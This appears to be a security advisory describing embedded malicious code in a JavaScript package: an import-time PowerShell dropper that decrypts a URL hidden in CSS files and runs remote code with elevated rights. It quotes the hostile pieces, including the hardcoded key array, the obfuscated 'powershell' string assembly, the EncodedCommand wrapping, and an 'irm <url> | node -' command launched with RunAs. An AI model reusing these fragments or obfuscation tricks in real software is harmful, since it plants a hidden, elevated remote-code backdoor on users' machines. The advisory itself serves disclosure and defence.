summary: Hidden import-time PowerShell dropper executes remote code with UAC elevation
details: On import, dist/index.js executes a top-level async block that recursively walks the consumer's project directories (up to depth 5, skipping node_modules/.git/dist/build/.next) looking for any.css file containing an `@sri-hash:` base64 marker. The marker value is AES-256-CBC-decrypted using a hardcoded key assembled from a split hex array (`['a7b80b01','7e76fb52','fa527621','f76027d2','19014dfc','a59b49ae','3db97ff3','ab4a72fa'].join('')`) with the IV taken from the first 16 bytes of the blob. The decrypted value is a URL, which is then run through PowerShell as `Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -Command "irm <url> | node -"' -Verb RunAs`, wrapped via `Buffer.from(m,'utf16le').toString('base64')` into a `-EncodedCommand`, and spawned hidden/detached with admin elevation. This pipes arbitrary attacker-controlled JavaScript directly into `node` with elevated privileges on Windows hosts. Multiple obfuscation techniques are in use (split-key hex array, utf16le→base64 EncodedCommand wrapping, `['power','shell','.exe'].join('')` string assembly, dynamic `node:*` imports) to evade scanners. The CSS-marker channel is mutable: any attacker who can plant a.css file with the marker (poisoned peer dependency, compromised CDN asset, etc.) controls what executes with admin rights on the next import.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
